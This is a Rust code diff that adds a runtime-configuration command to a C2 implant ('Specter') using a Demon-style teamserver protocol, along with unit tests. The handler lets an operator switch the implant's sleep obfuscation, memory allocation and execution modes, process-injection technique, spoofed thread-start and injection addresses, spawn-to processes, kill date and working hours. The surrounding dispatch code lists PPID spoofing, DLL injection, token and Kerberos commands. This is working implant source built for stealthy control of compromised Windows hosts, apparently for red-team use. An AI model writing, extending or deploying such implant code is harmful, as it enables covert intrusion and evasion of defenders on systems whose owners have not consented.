@@ -16,8 +16,9 @@ use std::process::{Command as SysCommand, Stdio};
 use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
-    DemonCommand, DemonFilesystemCommand, DemonInjectError, DemonInjectWay, DemonKerberosCommand,
-    DemonNetCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand, DemonTransferCommand,
+    DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonInjectError, DemonInjectWay,
+    DemonKerberosCommand, DemonNetCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand,
+    DemonTransferCommand,
 };
 use tracing::{info, warn};
 
@@ -133,6 +134,7 @@ pub fn dispatch(
         DemonCommand::CommandSpawnDll => handle_spawn_dll(&package.payload),
         DemonCommand::CommandProcPpidSpoof => handle_proc_ppid_spoof(&package.payload, config),
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
+        DemonCommand::CommandConfig => handle_config(&package.payload, config),
         DemonCommand::CommandExit => DispatchResult::Exit,
         // These are agent-to-server callbacks; ignore if received from server.
         DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
@@ -3241,6 +3243,216 @@ fn spawn_dll_native(loader: &[u8], dll: &[u8], args: &[u8]) -> DemonInjectError 
     inject_native::spawn_dll(loader, dll, args)
 }
 
+// ─── COMMAND_CONFIG (2500) ───────────────────────────────────────────────────
+
+/// Handle a `CommandConfig` task: update a runtime configuration value and echo
+/// the new setting back to the teamserver.
+///
+/// Incoming payload (LE): `[config_key: u32][key-specific value(s)…]`
+/// Outgoing payload (LE): `[config_key: u32][key-specific echo value(s)…]`
+fn handle_config(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
+    let mut offset = 0;
+
+    let key_raw = match parse_u32_le(payload, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse config key: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let key = match DemonConfigKey::try_from(key_raw) {
+        Ok(k) => k,
+        Err(_) => {
+            warn!(key = key_raw, "CommandConfig: unknown config key — ignoring");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let rest = &payload[offset..];
+    match key {
+        DemonConfigKey::ImplantVerbose => handle_config_u32_bool(key_raw, rest, config, |c, v| {
+            c.verbose = v != 0;
+        }),
+        DemonConfigKey::ImplantSleepTechnique => {
+            handle_config_u32(key_raw, rest, config, |c, v| c.sleep_technique = v)
+        }
+        DemonConfigKey::ImplantCoffeeThreaded => {
+            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_threaded = v != 0)
+        }
+        DemonConfigKey::ImplantCoffeeVeh => {
+            handle_config_u32_bool(key_raw, rest, config, |c, v| c.coffee_veh = v != 0)
+        }
+        DemonConfigKey::MemoryAlloc => {
+            handle_config_u32(key_raw, rest, config, |c, v| c.memory_alloc = v)
+        }
+        DemonConfigKey::MemoryExecute => {
+            handle_config_u32(key_raw, rest, config, |c, v| c.memory_execute = v)
+        }
+        DemonConfigKey::InjectTechnique => {
+            handle_config_u32(key_raw, rest, config, |c, v| c.inject_technique = v)
+        }
+        DemonConfigKey::ImplantSpfThreadStart => {
+            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
+                c.spf_thread_addr = Some((lib, func, off));
+            })
+        }
+        DemonConfigKey::InjectSpoofAddr => {
+            handle_config_addr(key_raw, rest, config, |c, lib, func, off| {
+                c.inject_spoof_addr = Some((lib, func, off));
+            })
+        }
+        DemonConfigKey::InjectSpawn64 => {
+            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn64 = Some(path))
+        }
+        DemonConfigKey::InjectSpawn32 => {
+            handle_config_spawn(key_raw, rest, config, |c, path| c.spawn32 = Some(path))
+        }
+        DemonConfigKey::KillDate => handle_config_killdate(key_raw, rest, config),
+        DemonConfigKey::WorkingHours => {
+            handle_config_u32(key_raw, rest, config, |c, v| c.working_hours = Some(v as i32))
+        }
+    }
+}
+
+/// Config sub-handler for simple `u32` values: read value, apply setter, echo back.
+fn handle_config_u32(
+    key_raw: u32,
+    rest: &[u8],
+    config: &mut SpecterConfig,
+    setter: impl FnOnce(&mut SpecterConfig, u32),
+) -> DispatchResult {
+    let mut offset = 0;
+    let value = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse u32 value: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    setter(config, value);
+
+    let mut out = Vec::with_capacity(8);
+    write_u32_le(&mut out, key_raw);
+    write_u32_le(&mut out, value);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
+}
+
+/// Config sub-handler for boolean-as-u32 values (same wire format as `handle_config_u32`).
+fn handle_config_u32_bool(
+    key_raw: u32,
+    rest: &[u8],
+    config: &mut SpecterConfig,
+    setter: impl FnOnce(&mut SpecterConfig, u32),
+) -> DispatchResult {
+    handle_config_u32(key_raw, rest, config, setter)
+}
+
+/// Config sub-handler for address triplets: `[library: string][function: string][offset: u32]`.
+///
+/// Echoes back `[config_key][library: string][function: string]`.
+fn handle_config_addr(
+    key_raw: u32,
+    rest: &[u8],
+    config: &mut SpecterConfig,
+    setter: impl FnOnce(&mut SpecterConfig, String, String, u32),
+) -> DispatchResult {
+    let mut offset = 0;
+    let lib_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse addr library: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let func_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse addr function: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+    let off = match parse_u32_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse addr offset: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let library = String::from_utf8_lossy(&lib_bytes).trim_end_matches('\0').to_string();
+    let function = String::from_utf8_lossy(&func_bytes).trim_end_matches('\0').to_string();
+
+    info!(library = %library, function = %function, offset = off, "config addr updated");
+    setter(config, library.clone(), function.clone(), off);
+
+    // Echo back: [key][library string][function string]
+    let mut out = Vec::new();
+    write_u32_le(&mut out, key_raw);
+    write_string_le(&mut out, &library);
+    write_string_le(&mut out, &function);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
+}
+
+/// Config sub-handler for spawn process paths (UTF-16LE encoded from the server).
+///
+/// Echoes back `[config_key][path: utf16le]`.
+fn handle_config_spawn(
+    key_raw: u32,
+    rest: &[u8],
+    config: &mut SpecterConfig,
+    setter: impl FnOnce(&mut SpecterConfig, String),
+) -> DispatchResult {
+    let mut offset = 0;
+    let raw_bytes = match parse_bytes_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse spawn path: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    let path = decode_utf16le_null(&raw_bytes);
+    info!(path = %path, "config spawn path updated");
+    setter(config, path.clone());
+
+    // Echo back: [key][path as utf16le]
+    let mut out = Vec::new();
+    write_u32_le(&mut out, key_raw);
+    write_utf16le(&mut out, &path);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
+}
+
+/// Config sub-handler for kill date (`i64` Unix timestamp).
+///
+/// Echoes back `[config_key][timestamp: u64]`.
+fn handle_config_killdate(key_raw: u32, rest: &[u8], config: &mut SpecterConfig) -> DispatchResult {
+    let mut offset = 0;
+    let raw = match parse_u64_le(rest, &mut offset) {
+        Ok(v) => v,
+        Err(e) => {
+            warn!("CommandConfig: failed to parse kill date: {e}");
+            return DispatchResult::Ignore;
+        }
+    };
+
+    config.kill_date = if raw == 0 { None } else { Some(raw as i64) };
+    info!(kill_date = ?config.kill_date, "config kill date updated");
+
+    let mut out = Vec::with_capacity(12);
+    write_u32_le(&mut out, key_raw);
+    write_ptr_le(&mut out, raw);
+    DispatchResult::Respond(Response::new(DemonCommand::CommandConfig, out))
+}
+
+/// Append a NUL-terminated UTF-8 string as `[u32 LE length][bytes + NUL]`.
+fn write_string_le(buf: &mut Vec<u8>, s: &str) {
+    let mut data = Vec::with_capacity(s.len() + 1);
+    data.extend_from_slice(s.as_bytes());
+    data.push(0);
+    write_bytes_le(buf, &data);
+}
+
 // ─── Payload parsing helpers (server → agent, little-endian) ─────────────────
 
 /// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
@@ -5957,5 +6169,298 @@ mod tests {
     fn kerberos_empty_payload_ignored() {
         let result = handle_kerberos(&[]);
         assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── CommandConfig tests ───────────────────────────────────────────────────
+
+    /// Build a config payload: `[key: u32 LE][extra…]`
+    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
+        let mut v = key.to_le_bytes().to_vec();
+        v.extend_from_slice(extra);
+        v
+    }
+
+    /// Parse a LE u32 from a response payload at the given byte offset.
+    fn resp_u32(payload: &[u8], byte_offset: usize) -> u32 {
+        u32::from_le_bytes(payload[byte_offset..byte_offset + 4].try_into().unwrap())
+    }
+
+    /// Parse a LE u64 from a response payload at the given byte offset.
+    fn resp_u64(payload: &[u8], byte_offset: usize) -> u64 {
+        u64::from_le_bytes(payload[byte_offset..byte_offset + 8].try_into().unwrap())
+    }
+
+    #[test]
+    fn config_empty_payload_ignored() {
+        let mut config = SpecterConfig::default();
+        let result = handle_config(&[], &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_unknown_key_ignored() {
+        let mut config = SpecterConfig::default();
+        let payload = config_payload(9999, &[]);
+        let result = handle_config(&payload, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_implant_verbose_sets_flag() {
+        let mut config = SpecterConfig::default();
+        assert!(!config.verbose);
+
+        let extra = 1u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert!(config.verbose);
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
+        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantVerbose));
+        assert_eq!(resp_u32(&resp.payload, 4), 1);
+    }
+
+    #[test]
+    fn config_implant_verbose_zero_clears_flag() {
+        let mut config = SpecterConfig { verbose: true, ..Default::default() };
+
+        let extra = 0u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
+        handle_config(&payload, &mut config);
+        assert!(!config.verbose);
+    }
+
+    #[test]
+    fn config_sleep_technique_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 3u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantSleepTechnique), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert_eq!(config.sleep_technique, 3);
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSleepTechnique));
+        assert_eq!(resp_u32(&resp.payload, 4), 3);
+    }
+
+    #[test]
+    fn config_coffee_threaded_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 1u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeThreaded), &extra);
+        handle_config(&payload, &mut config);
+        assert!(config.coffee_threaded);
+    }
+
+    #[test]
+    fn config_coffee_veh_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 1u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantCoffeeVeh), &extra);
+        handle_config(&payload, &mut config);
+        assert!(config.coffee_veh);
+    }
+
+    #[test]
+    fn config_memory_alloc_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 42u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert_eq!(config.memory_alloc, 42);
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp_u32(&resp.payload, 4), 42);
+    }
+
+    #[test]
+    fn config_memory_execute_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 7u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::MemoryExecute), &extra);
+        handle_config(&payload, &mut config);
+        assert_eq!(config.memory_execute, 7);
+    }
+
+    #[test]
+    fn config_inject_technique_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 5u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::InjectTechnique), &extra);
+        handle_config(&payload, &mut config);
+        assert_eq!(config.inject_technique, 5);
+    }
+
+    #[test]
+    fn config_killdate_sets_timestamp() {
+        let mut config = SpecterConfig::default();
+        let ts: u64 = 1_700_000_000;
+        let extra = ts.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert_eq!(config.kill_date, Some(ts as i64));
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::KillDate));
+        assert_eq!(resp_u64(&resp.payload, 4), ts);
+    }
+
+    #[test]
+    fn config_killdate_zero_clears() {
+        let mut config = SpecterConfig { kill_date: Some(123), ..Default::default() };
+        let extra = 0u64.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &extra);
+        handle_config(&payload, &mut config);
+        assert_eq!(config.kill_date, None);
+    }
+
+    #[test]
+    fn config_killdate_missing_value_ignored() {
+        let mut config = SpecterConfig::default();
+        let payload = config_payload(u32::from(DemonConfigKey::KillDate), &[]);
+        let result = handle_config(&payload, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_working_hours_updates() {
+        let mut config = SpecterConfig::default();
+        let extra = 0x00FF_FF00u32.to_le_bytes();
+        let payload = config_payload(u32::from(DemonConfigKey::WorkingHours), &extra);
+        handle_config(&payload, &mut config);
+        assert_eq!(config.working_hours, Some(0x00FF_FF00u32 as i32));
+    }
+
+    #[test]
+    fn config_spf_thread_addr_updates() {
+        let mut config = SpecterConfig::default();
+        // Build: [key][lib_len][lib_bytes\0][func_len][func_bytes\0][offset]
+        let lib = b"ntdll.dll\0";
+        let func = b"RtlUserThreadStart\0";
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
+        extra.extend_from_slice(lib);
+        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        extra.extend_from_slice(func);
+        extra.extend_from_slice(&0x10u32.to_le_bytes());
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert_eq!(
+            config.spf_thread_addr,
+            Some(("ntdll.dll".to_string(), "RtlUserThreadStart".to_string(), 0x10))
+        );
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::ImplantSpfThreadStart));
+    }
+
+    #[test]
+    fn config_inject_spoof_addr_updates() {
+        let mut config = SpecterConfig::default();
+        let lib = b"kernel32.dll\0";
+        let func = b"CreateThread\0";
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
+        extra.extend_from_slice(lib);
+        extra.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        extra.extend_from_slice(func);
+        extra.extend_from_slice(&0x20u32.to_le_bytes());
+        let payload = config_payload(u32::from(DemonConfigKey::InjectSpoofAddr), &extra);
+        handle_config(&payload, &mut config);
+
+        assert_eq!(
+            config.inject_spoof_addr,
+            Some(("kernel32.dll".to_string(), "CreateThread".to_string(), 0x20))
+        );
+    }
+
+    #[test]
+    fn config_addr_missing_function_ignored() {
+        let mut config = SpecterConfig::default();
+        let lib = b"ntdll.dll\0";
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(lib.len() as u32).to_le_bytes());
+        extra.extend_from_slice(lib);
+        // No function or offset follows.
+        let payload = config_payload(u32::from(DemonConfigKey::ImplantSpfThreadStart), &extra);
+        let result = handle_config(&payload, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_spawn64_updates() {
+        let mut config = SpecterConfig::default();
+        // The server sends the path as length-prefixed UTF-16LE bytes.
+        let path_str = "C:\\Windows\\System32\\notepad.exe";
+        let utf16: Vec<u8> = path_str
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
+        extra.extend_from_slice(&utf16);
+        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &extra);
+        let result = handle_config(&payload, &mut config);
+
+        assert_eq!(config.spawn64.as_deref(), Some(path_str));
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp_u32(&resp.payload, 0), u32::from(DemonConfigKey::InjectSpawn64));
+    }
+
+    #[test]
+    fn config_spawn32_updates() {
+        let mut config = SpecterConfig::default();
+        let path_str = "C:\\Windows\\SysWOW64\\cmd.exe";
+        let utf16: Vec<u8> = path_str
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        let mut extra = Vec::new();
+        extra.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
+        extra.extend_from_slice(&utf16);
+        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn32), &extra);
+        handle_config(&payload, &mut config);
+
+        assert_eq!(config.spawn32.as_deref(), Some(path_str));
+    }
+
+    #[test]
+    fn config_spawn_missing_bytes_ignored() {
+        let mut config = SpecterConfig::default();
+        let payload = config_payload(u32::from(DemonConfigKey::InjectSpawn64), &[]);
+        let result = handle_config(&payload, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_u32_missing_value_ignored() {
+        let mut config = SpecterConfig::default();
+        // Key with no value bytes.
+        let payload = config_payload(u32::from(DemonConfigKey::MemoryAlloc), &[]);
+        let result = handle_config(&payload, &mut config);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn config_dispatch_routes_correctly() {
+        let extra = 1u32.to_le_bytes();
+        let inner = config_payload(u32::from(DemonConfigKey::ImplantVerbose), &extra);
+        let pkg = DemonPackage {
+            command_id: u32::from(DemonCommand::CommandConfig),
+            request_id: 42,
+            payload: inner,
+        };
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::default();
+        let mut mem_files = MemFileStore::new();
+        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+
+        assert!(config.verbose);
+        let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandConfig));
     }
 }
